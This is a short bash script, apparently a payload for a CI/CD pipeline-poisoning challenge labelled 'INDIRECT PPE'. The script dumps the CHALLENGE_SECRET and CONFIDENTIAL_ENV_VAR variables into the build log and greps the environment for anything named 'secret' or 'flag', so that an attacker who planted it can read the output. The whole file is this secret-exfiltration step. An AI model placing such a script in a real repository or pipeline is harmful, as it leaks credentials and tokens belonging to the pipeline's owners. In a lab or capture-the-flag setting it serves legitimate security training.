#!/bin/bash
echo "INDIRECT PPE - Extracting secret..."

echo "CHALLENGE_SECRET: $CHALLENGE_SECRET"

echo "All secrets check:"
env | grep -i secret || echo "No secrets found"
env | grep -i flag || echo "No flags found"

echo "Workflow env vars:"
echo "CONFIDENTIAL_ENV_VAR=$CONFIDENTIAL_ENV_VAR"
